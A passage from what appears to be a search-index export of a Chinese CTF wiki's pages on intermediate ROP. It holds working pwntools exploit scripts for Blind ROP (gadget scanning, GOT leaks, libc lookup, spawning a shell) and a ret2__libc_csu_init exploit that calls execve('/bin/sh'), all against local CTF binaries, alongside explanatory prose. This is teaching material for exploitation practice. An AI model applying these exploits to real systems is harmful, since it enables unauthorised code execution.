\nreturn\n \nTrue\n\n    \nexcept\n \nException\n:\n\n        \nsh\n.\nclose\n()\n\n        \nreturn\n \nFalse\n\n\n\n\ndef\n \ncheck_brop_gadget\n(\nlength\n,\n \naddr\n):\n\n    \ntry\n:\n\n        \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n        \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n        \npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\naddr\n)\n \n+\n \na\n \n*\n \n8\n \n*\n \n10\n\n        \nsh\n.\nsendline\n(\npayload\n)\n\n        \ncontent\n \n=\n \nsh\n.\nrecv\n()\n\n        \nsh\n.\nclose\n()\n\n        \nreturn\n \nFalse\n\n    \nexcept\n \nException\n:\n\n        \nsh\n.\nclose\n()\n\n        \nreturn\n \nTrue\n\n\n\n\n##length = getbufferflow_length()\n\n\nlength\n \n=\n \n72\n\n\n##get_stop_addr(length)\n\n\nstop_gadget\n \n=\n \n0x4006b6\n\n\naddr\n \n=\n \n0x400740\n\n\nwhile\n \n1\n:\n\n    \nprint\n \nhex\n(\naddr\n)\n\n    \nif\n \nget_brop_gadget\n(\nlength\n,\n \nstop_gadget\n,\n \naddr\n):\n\n        \nprint\n \npossible brop gadget: 0x\n%x\n \n%\n \naddr\n\n        \nif\n \ncheck_brop_gadget\n(\nlength\n,\n \naddr\n):\n\n            \nprint\n \nsuccess brop gadget: 0x\n%x\n \n%\n \naddr\n\n            \nbreak\n\n    \naddr\n \n+=\n \n1\n\n\n\n\n\n\u8fd9\u6837\uff0c\u6211\u4eec\u57fa\u672c\u5f97\u5230\u4e86brop\u7684gadgets\u5730\u57400x4007ba\n\n\n\u786e\u5b9aputs@plt\u5730\u5740\n\n\n\u6839\u636e\u4e0a\u9762\uff0c\u6240\u8bf4\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpayload\u6765\u8fdb\u884c\u83b7\u53d6\n\n\npayload = \nA\n*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n\n\n\n\n\u5177\u4f53\u51fd\u6570\u5982\u4e0b\n\n\ndef\n \nget_puts_addr\n(\nlength\n,\n \nrdi_ret\n,\n \nstop_gadget\n):\n\n    \naddr\n \n=\n \n0x400000\n\n    \nwhile\n \n1\n:\n\n        \nprint\n \nhex\n(\naddr\n)\n\n        \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n        \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n        \npayload\n \n=\n \nA\n \n*\n \nlength\n \n+\n \np64\n(\nrdi_ret\n)\n \n+\n \np64\n(\n0x400000\n)\n \n+\n \np64\n(\n\n            \naddr\n)\n \n+\n \np64\n(\nstop_gadget\n)\n\n        \nsh\n.\nsendline\n(\npayload\n)\n\n        \ntry\n:\n\n            \ncontent\n \n=\n \nsh\n.\nrecv\n()\n\n            \nif\n \ncontent\n.\nstartswith\n(\n\\x7f\nELF\n):\n\n                \nprint\n \nfind puts@plt addr: 0x\n%x\n \n%\n \naddr\n\n                \nreturn\n \naddr\n\n            \nsh\n.\nclose\n()\n\n            \naddr\n \n+=\n \n1\n\n        \nexcept\n \nException\n:\n\n            \nsh\n.\nclose\n()\n\n            \naddr\n \n+=\n \n1\n\n\n\n\n\n\u6700\u540e\u6839\u636eplt\u7684\u7ed3\u6784\uff0c\u9009\u62e90x400560\u4f5c\u4e3aputs@plt\n\n\n\u6cc4\u9732puts@got\u5730\u5740\n\n\n\u5728\u6211\u4eec\u53ef\u4ee5\u8c03\u7528puts\u51fd\u6570\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732puts\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\uff0c\u4ece\u800c\u83b7\u53d6\u76f8\u5173\u7684system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5730\u5740\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\u6211\u4eec\u4ece0x400000\u5f00\u59cb\u6cc4\u97320x1000\u4e2a\u5b57\u8282\uff0c\u8fd9\u5df2\u7ecf\u8db3\u591f\u5305\u542b\u7a0b\u5e8f\u7684plt\u90e8\u5206\u4e86\u3002\u4ee3\u7801\u5982\u4e0b\n\n\ndef\n \nleak\n(\nlength\n,\n \nrdi_ret\n,\n \nputs_plt\n,\n \nleak_addr\n,\n \nstop_gadget\n):\n\n    \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n    \npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\nrdi_ret\n)\n \n+\n \np64\n(\nleak_addr\n)\n \n+\n \np64\n(\n\n        \nputs_plt\n)\n \n+\n \np64\n(\nstop_gadget\n)\n\n    \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \ntry\n:\n\n        \ndata\n \n=\n \nsh\n.\nrecv\n()\n\n        \nsh\n.\nclose\n()\n\n        \ntry\n:\n\n            \ndata\n \n=\n \ndata\n[:\ndata\n.\nindex\n(\n\\n\nWelCome\n)]\n\n        \nexcept\n \nException\n:\n\n            \ndata\n \n=\n \ndata\n\n        \nif\n \ndata\n \n==\n \n:\n\n            \ndata\n \n=\n \n\\x00\n\n        \nreturn\n \ndata\n\n    \nexcept\n \nException\n:\n\n        \nsh\n.\nclose\n()\n\n        \nreturn\n \nNone\n\n\n\n\n##length = getbufferflow_length()\n\n\nlength\n \n=\n \n72\n\n\n##stop_gadget = get_stop_addr(length)\n\n\nstop_gadget\n \n=\n \n0x4006b6\n\n\n##brop_gadget = find_brop_gadget(length,stop_gadget)\n\n\nbrop_gadget\n \n=\n \n0x4007ba\n\n\nrdi_ret\n \n=\n \nbrop_gadget\n \n+\n \n9\n\n\n##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)\n\n\nputs_plt\n \n=\n \n0x400560\n\n\naddr\n \n=\n \n0x400000\n\n\nresult\n \n=\n \n\n\nwhile\n \naddr\n \n \n0x401000\n:\n\n    \nprint\n \nhex\n(\naddr\n)\n\n    \ndata\n \n=\n \nleak\n(\nlength\n,\n \nrdi_ret\n,\n \nputs_plt\n,\n \naddr\n,\n \nstop_gadget\n)\n\n    \nif\n \ndata\n \nis\n \nNone\n:\n\n        \ncontinue\n\n    \nelse\n:\n\n        \nresult\n \n+=\n \ndata\n\n    \naddr\n \n+=\n \nlen\n(\ndata\n)\n\n\nwith\n \nopen\n(\ncode\n,\n \nwb\n)\n \nas\n \nf\n:\n\n    \nf\n.\nwrite\n(\nresult\n)\n\n\n\n\n\n\u6700\u540e\uff0c\u6211\u4eec\u5c06\u6cc4\u9732\u7684\u5185\u5bb9\u5199\u5230\u6587\u4ef6\u91cc\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5982\u679c\u6cc4\u9732\u51fa\u6765\u7684\u662f\u201c\u201d,\u90a3\u8bf4\u660e\u6211\u4eec\u9047\u5230\u4e86'\\x00'\uff0c\u56e0\u4e3aputs\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u662f\u4ee5'\\x00'\u4e3a\u7ec8\u6b62\u7b26\u7684\u3002\u4e4b\u540e\u5229\u7528ida\u6253\u5f00binary\u6a21\u5f0f\uff0c\u9996\u5148\u5728edit-\nsegments-\nrebase program \u5c06\u7a0b\u5e8f\u7684\u57fa\u5730\u5740\u6539\u4e3a0x400000\uff0c\u7136\u540e\u627e\u5230\u504f\u79fb0x560\u5904\uff0c\u5982\u4e0b\n\n\nseg000:\n0000000000400560\n                 \ndb\n \n0\nFFh\n\n\nseg000:\n0000000000400561\n                 \ndb\n  \n25\nh\n \n; %\n\n\nseg000\n:\n0000000000400562\n                 \ndb\n \n0\nB2h\n \n; \n\n\nseg000\n:\n0000000000400563\n                 \ndb\n  \n0\nAh\n\n\nseg000:\n0000000000400564\n                 \ndb\n  \n20\nh\n\n\nseg000:\n0000000000400565\n                 \ndb\n    \n0\n\n\n\n\n\n\u7136\u540e\u6309\u4e0bc,\u5c06\u6b64\u5904\u7684\u6570\u636e\u8f6c\u6362\u4e3a\u6c47\u7f16\u6307\u4ee4\uff0c\u5982\u4e0b\n\n\nseg000:\n0000000000400560\n \n; ---------------------------------------------------------------------------\n\n\nseg000:\n0000000000400560\n                 \njmp\n     \nqword\n \nptr\n \ncs\n:\n601018\nh\n\n\nseg000:\n0000000000400566\n \n; ---------------------------------------------------------------------------\n\n\nseg000:\n0000000000400566\n                 \npush\n    \n0\n\n\nseg000:\n000000000040056\nB\n                 \njmp\n     \nloc_400550\n\n\nseg000:\n000000000040056\nB\n \n; ---------------------------------------------------------------------------\n\n\n\n\n\n\u8fd9\u8bf4\u660e\uff0cputs@got\u7684\u5730\u5740\u4e3a0x601018\u3002\n\n\n\u7a0b\u5e8f\u5229\u7528\n\n\n##length = getbufferflow_length()\n\n\nlength\n \n=\n \n72\n\n\n##stop_gadget = get_stop_addr(length)\n\n\nstop_gadget\n \n=\n \n0x4006b6\n\n\n##brop_gadget = find_brop_gadget(length,stop_gadget)\n\n\nbrop_gadget\n \n=\n \n0x4007ba\n\n\nrdi_ret\n \n=\n \nbrop_gadget\n \n+\n \n9\n\n\n##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)\n\n\nputs_plt\n \n=\n \n0x400560\n\n\n##leakfunction(length, rdi_ret, puts_plt, stop_gadget)\n\n\nputs_got\n \n=\n \n0x601018\n\n\n\nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n\nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n\npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\nrdi_ret\n)\n \n+\n \np64\n(\nputs_got\n)\n \n+\n \np64\n(\nputs_plt\n)\n \n+\n \np64\n(\n\n    \nstop_gadget\n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\ndata\n \n=\n \nsh\n.\nrecvuntil\n(\n\\n\nWelCome\n,\n \ndrop\n=\nTrue\n)\n\n\nputs_addr\n \n=\n \nu64\n(\ndata\n.\nljust\n(\n8\n,\n \n\\x00\n))\n\n\nlibc\n \n=\n \nLibcSearcher\n(\nputs\n,\n \nputs_addr\n)\n\n\nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\ndump\n(\nputs\n)\n\n\nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nstr_bin_sh\n)\n\n\npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\nrdi_ret\n)\n \n+\n \np64\n(\nbinsh_addr\n)\n \n+\n \np64\n(\n\n    \nsystem_addr\n)\n \n+\n \np64\n(\nstop_gadget\n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nhttp://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/\n\n\nhttp://bobao.360.cn/learning/detail/3694.html\n\n\nhttp://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/", 
            "title": "\u4e2d\u7ea7 ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#rop", 
            "text": "\u4e2d\u7ea7ROP\u4e3b\u8981\u662f\u4f7f\u7528\u4e86\u4e00\u4e9b\u6bd4\u8f83\u5de7\u5999\u7684Gadgets\u3002", 
            "title": "\u4e2d\u7ea7ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#ret2__libc_scu_init", 
            "text": "", 
            "title": "ret2__libc_scu_init"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_1", 
            "text": "\u572864\u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u7684\uff0c\u4f46\u662f\u5927\u591a\u6570\u65f6\u5019\uff0c\u6211\u4eec\u5f88\u96be\u627e\u5230\u6bcf\u4e00\u4e2a\u5bc4\u5b58\u5668\u5bf9\u5e94\u7684gadgets\u3002 \u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528x64\u4e0b\u7684__libc_scu_init\u4e2d\u7684gadgets\u3002\u8fd9\u4e2a\u51fd\u6570\u662f\u7528\u6765\u5bf9libc\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\u7684\uff0c\u800c\u4e00\u822c\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528libc\u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u4e00\u5b9a\u4f1a\u5b58\u5728\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570(\u5f53\u7136\uff0c\u4e0d\u540c\u7248\u672c\u7684\u8fd9\u4e2a\u51fd\u6570\u6709\u4e00\u5b9a\u7684\u533a\u522b)  .text: 00000000004005 C0   ; void _libc_csu_init(void)  .text : 00000000004005 C0                   public   __libc_csu_init  .text: 00000000004005 C0   __libc_csu_init   proc   near                 ; DATA XREF: _start+16\u0018o  .text : 00000000004005 C0                   push      r15  .text: 00000000004005 C2                   push      r14  .text: 00000000004005 C4                   mov       r15d ,   edi  .text: 00000000004005 C7                   push      r13  .text: 00000000004005 C9                   push      r12  .text: 00000000004005 CB                   lea       r12 ,   __frame_dummy_init_array_entry  .text: 00000000004005 D2                   push      rbp  .text: 00000000004005 D3                   lea       rbp ,   __do_global_dtors_aux_fini_array_entry  .text: 00000000004005 DA                   push      rbx  .text: 00000000004005 DB                   mov       r14 ,   rsi  .text: 00000000004005 DE                   mov       r13 ,   rdx  .text: 00000000004005 E1                   sub       rbp ,   r12  .text: 00000000004005 E4                   sub       rsp ,   8  .text: 00000000004005 E8                   sar       rbp ,   3  .text: 00000000004005 EC                   call      _init_proc  .text: 00000000004005 F1                   test      rbp ,   rbp  .text: 00000000004005 F4                   jz        short   loc_400616  .text: 00000000004005 F6                   xor       ebx ,   ebx  .text: 00000000004005 F8                   nop       dword   ptr   [ rax + rax + 00000000 h ]  .text: 0000000000400600  .text: 0000000000400600   loc_400600:                               ; CODE XREF: __libc_csu_init+54\u0019j  .text: 0000000000400600                   mov       rdx ,   r13  .text: 0000000000400603                   mov       rsi ,   r14  .text: 0000000000400606                   mov       edi ,   r15d  .text: 0000000000400609                   call      qword   ptr   [ r12 + rbx * 8 ]  .text: 000000000040060 D                   add       rbx ,   1  .text: 0000000000400611                   cmp       rbx ,   rbp  .text: 0000000000400614                   jnz       short   loc_400600  .text: 0000000000400616  .text: 0000000000400616   loc_400616:                               ; CODE XREF: __libc_csu_init+34\u0018j  .text: 0000000000400616                   add       rsp ,   8  .text: 000000000040061 A                   pop       rbx  .text: 000000000040061 B                   pop       rbp  .text: 000000000040061 C                   pop       r12  .text: 000000000040061 E                   pop       r13  .text: 0000000000400620                   pop       r14  .text: 0000000000400622                   pop       r15  .text: 0000000000400624                   retn  .text: 0000000000400624   __libc_csu_init   endp   \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4ee5\u4e0b\u51e0\u70b9   \u4ece0x000000000040061A\u4e00\u76f4\u5230\u7ed3\u5c3e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020\u6808\u4e0a\u6570\u636e\u6765\u63a7\u5236rbx,rbp,r12,r13,r14,r15\u5bc4\u5b58\u5668\u7684\u6570\u636e\u3002  \u4ece0x0000000000400600\u52300x0000000000400609\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06r13\u8d4b\u7ed9rdx,\u5c06r14\u8d4b\u7ed9rsi\uff0c\u5c06r15d\u8d4b\u7ed9edi\uff08\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136\u8fd9\u91cc\u8d4b\u7ed9\u7684\u662fedi\uff0c \u4f46\u5176\u5b9e\u6b64\u65f6rdi\u7684\u9ad832\u4f4d\u5bc4\u5b58\u5668\u503c\u4e3a0\uff08\u81ea\u884c\u8c03\u8bd5\uff09 \uff0c\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rdi\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ea\u4e0d\u8fc7\u53ea\u80fd\u63a7\u5236\u4f4e32\u4f4d\uff09\uff0c\u800c\u8fd9\u4e09\u4e2a\u5bc4\u5b58\u5668\uff0c\u4e5f\u662fx64\u51fd\u6570\u8c03\u7528\u4e2d\u4f20\u9012\u7684\u524d\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5408\u7406\u5730\u63a7\u5236r12\u4e0erbx\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rbx\u4e3a0\uff0cr12\u4e3a\u5b58\u50a8\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740\u3002  \u4ece0x000000000040060D\u52300x0000000000400614\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rbx\u4e0erbp\u7684\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3arbx+1=rbp\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u4f1a\u6267\u884cloc_400600\uff0c\u8fdb\u800c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u6c47\u7f16\u7a0b\u5e8f\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u8bbe\u7f6erbx=0\uff0crbp=1\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_2", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5\u84b8\u7c73\u7684\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u4e4blinux_x64\u7bc7\u4e2dlevel5\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\u68c0\u67e5\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4  \u279c  ret2__libc_csu_init git: ( iromise )  \u2717 checksec level5   \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002  \u5176\u6b21\uff0c\u5bfb\u627e\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u6808\u6ea2\u51fa  ssize_t   vulnerable_function ()  { \n   char   buf ;   // [sp+0h] [bp-80h]@1 \n\n   return   read ( 0 ,   buf ,   0x200uLL );  }   \u7b80\u5355\u6d4f\u89c8\u4e0b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u65e2\u6ca1\u6709system\u51fd\u6570\u5730\u5740\uff0c\u4e5f\u6ca1\u6709/bin/sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e24\u8005\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u6784\u9020\u4e86\u3002  \u6ce8\uff1a\u8fd9\u91cc\u6211\u5c1d\u8bd5\u5728\u6211\u672c\u673a\u4f7f\u7528system\u51fd\u6570\u6765\u83b7\u53d6shell\u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u73af\u5883\u53d8\u91cf\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662fexecve\u6765\u83b7\u53d6shell\u3002  \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u83b7\u53d6write\u51fd\u6570\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain\u51fd\u6570  \u6839\u636elibcsearcher\u83b7\u53d6\u5bf9\u5e94libc\u7248\u672c\u4ee5\u53caexecve\u51fd\u6570\u5730\u5740  \u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u5411bss\u6bb5\u5199\u5165execve\u5730\u5740\u4ee5\u53ca'/bin/sh\u2019\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain\u51fd\u6570\u3002  \u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u6267\u884cexecve('/bin/sh')\u83b7\u53d6shell\u3002   exp\u5982\u4e0b  from   pwn   import   *  from   LibcSearcher   import   LibcSearcher  ##context.log_level =  debug  level5   =   ELF ( ./level5 )  sh   =   process ( ./level5 )  write_got   =   level5 . got [ write ]  read_got   =   level5 . got [ read ]  main_addr   =   level5 . symbols [ main ]  bss_base   =   level5 . bss ()  csu_front_addr   =   0x0000000000400600  csu_end_addr   =   0x000000000040061A  fakeebp   =   b   *   8  def   csu ( rbx ,   rbp ,   r12 ,   r13 ,   r14 ,   r15 ,   last ): \n     # pop rbx,rbp,r12,r13,r14,r15 \n     # rbx should be 0, \n     # rbp should be 1,enable not to jump \n     # r12 should be the function we want to call \n     # rdi=edi=r15d \n     # rsi=r14 \n     # rdx=r13 \n     payload   =   a   *   0x80   +   fakeebp \n     payload   +=   p64 ( csu_end_addr )   +   p64 ( rbx )   +   p64 ( rbp )   +   p64 ( r12 )   +   p64 ( \n         r13 )   +   p64 ( r14 )   +   p64 ( r15 ) \n     payload   +=   p64 ( csu_front_addr ) \n     payload   +=   a   *   0x38 \n     payload   +=   p64 ( last ) \n     sh . send ( payload ) \n     sleep ( 1 )  sh . recvuntil ( Hello, World \\n )  ## RDI, RSI, RDX, RCX, R8, R9, more on the stack  ## write(1,write_got,8)  csu ( 0 ,   1 ,   write_got ,   8 ,   write_got ,   1 ,   main_addr )  write_addr   =   u64 ( sh . recv ( 8 ))  libc   =   LibcSearcher ( write ,   write_addr )  libc_base   =   write_addr   -   libc . dump ( write )  execve_addr   =   libc_base   +   libc . dump ( execve )  log . success ( execve_addr    +   hex ( execve_addr ))  ##gdb.attach(sh)  ## read(0,bss_base,16)  ## read execve_addr and /bin/sh\\x00  sh . recvuntil ( Hello, World \\n )  csu ( 0 ,   1 ,   read_got ,   16 ,   bss_base ,   0 ,   main_addr )  sh . send ( p64 ( execve_addr )   +   /bin/sh \\x00 )  sh . recvuntil ( Hello, World \\n )  ## execve(bss_base+8)  csu ( 0 ,   1 ,   bss_base ,   0 ,   0 ,   bss_base   +   8 ,   main_addr )  sh . interactive ()", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_3", 
            "text": "", 
            "title": "\u601d\u8003"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_4", 
            "text": "\u5728\u4e0a\u9762\u7684\u65f6\u5019\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e86\u8fd9\u4e2a\u901a\u7528gadgets\uff0c\u5176\u8f93\u5165\u7684\u5b57\u8282\u957f\u5ea6\u4e3a128\u3002\u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u6f0f\u6d1e\u90fd\u53ef\u4ee5\u8ba9\u6211\u4eec\u8f93\u5165\u8fd9\u4e48\u957f\u7684\u5b57\u8282\u3002\u90a3\u4e48\u5f53\u5141\u8bb8\u6211\u4eec\u8f93\u5165\u7684\u5b57\u8282\u6570\u8f83\u5c11\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u6709\u4ec0\u4e48\u529e\u6cd5\u5462\uff1f\u4e0b\u9762\u7ed9\u51fa\u4e86\u51e0\u4e2a\u65b9\u6cd5", 
            "title": "\u6539\u8fdb"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#1-rbxrbp", 
            "text": "\u53ef\u4ee5\u770b\u5230\u5728\u6211\u4eec\u4e4b\u524d\u7684\u5229\u7528\u4e2d\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u6ee1\u8db3cmp\u7684\u6761\u4ef6\uff0c\u5e76\u8fdb\u884c\u8df3\u8f6c\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u51cf\u5c1116\u5b57\u8282\uff0c\u5373\u6211\u4eec\u6240\u9700\u7684\u5b57\u8282\u6570\u53ea\u9700\u8981112\u3002", 
            "title": "\u6539\u8fdb1-\u63d0\u524d\u63a7\u5236rbx\u4e0erbp"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#2-", 
            "text": "\u5176\u5b9e\uff0c\u6539\u8fdb1\u4e5f\u7b97\u662f\u4e00\u79cd\u591a\u6b21\u5229\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684gadgets\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u8fdb\u884c\u4e24\u6b21\u8c03\u7528\u6765\u8fbe\u5230\u7684\u76ee\u7684\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c11\u4e00\u6b21gadgets\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002\u4f46\u8fd9\u91cc\u7684\u591a\u6b21\u5229\u7528\u9700\u8981\u66f4\u52a0\u4e25\u683c\u7684\u6761\u4ef6   \u6f0f\u6d1e\u53ef\u4ee5\u88ab\u591a\u6b21\u89e6\u53d1  \u5728\u4e24\u6b21\u89e6\u53d1\u4e4b\u95f4\uff0c\u7a0b\u5e8f\u5c1a\u672a\u4fee\u6539r12-r15\u5bc4\u5b58\u5668\uff0c\u8fd9\u662f\u56e0\u4e3a\u8981\u4e24\u6b21\u8c03\u7528\u3002   \u5f53\u7136\uff0c\u6709\u65f6\u5019\u6211\u4eec\u4e5f\u4f1a\u9047\u5230\u4e00\u6b21\u6027\u53ef\u4ee5\u8bfb\u5165\u5927\u91cf\u7684\u5b57\u8282\uff0c\u4f46\u662f\u4e0d\u5141\u8bb8\u6f0f\u6d1e\u518d\u6b21\u5229\u7528\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u6211\u4eec\u4e00\u6b21\u6027\u5c06\u6240\u6709\u7684\u5b57\u8282\u5e03\u7f6e\u597d\uff0c\u4e4b\u540e\u6162\u6162\u5229\u7528\u3002", 
            "title": "\u6539\u8fdb2-\u591a\u6b21\u5229\u7528"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#gadget", 
            "text": "\u5176\u5b9e\uff0c\u9664\u4e86\u4e0a\u8ff0\u8fd9\u4e2agadgets\uff0cgcc\u9ed8\u8ba4\u8fd8\u4f1a\u7f16\u8bd1\u8fdb\u53bb\u4e00\u4e9b\u5176\u5b83\u7684\u51fd\u6570  _init\n_start\ncall_gmon_start\nderegister_tm_clones\nregister_tm_clones\n__do_global_dtors_aux\nframe_dummy\n__libc_csu_init\n__libc_csu_fini\n_fini  \u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u5176\u4e2d\u7684\u4e00\u4e9b\u4ee3\u7801\u6765\u8fdb\u884c\u6267\u884c\u3002\u6b64\u5916\uff0c\u7531\u4e8ePC\u672c\u8eab\u53ea\u662f\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u5730\u5740\u5904\u7684\u6570\u636e\u4f20\u9012\u7ed9CPU\uff0c\u800cCPU\u5219\u53ea\u662f\u5bf9\u4f20\u9012\u6765\u7684\u6570\u636e\u8fdb\u884c\u89e3\u7801\uff0c\u53ea\u8981\u89e3\u7801\u6210\u529f\uff0c\u5c31\u4f1a\u8fdb\u884c\u6267\u884c\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u6e90\u7a0b\u5e8f\u4e2d\u4e00\u4e9b\u5730\u5740\u8fdb\u884c\u504f\u79fb\u4ece\u800c\u6765\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u7684\u6307\u4ee4\uff0c\u53ea\u8981\u53ef\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u4e0d\u5d29\u6e83\u3002  \u9700\u8981\u4e00\u8bf4\u7684\u662f\uff0c\u5728\u4e0a\u9762\u7684libc_csu_init\u4e2d\u6211\u4eec\u4e3b\u8981\u5229\u7528\u4e86\u4ee5\u4e0b\u5bc4\u5b58\u5668   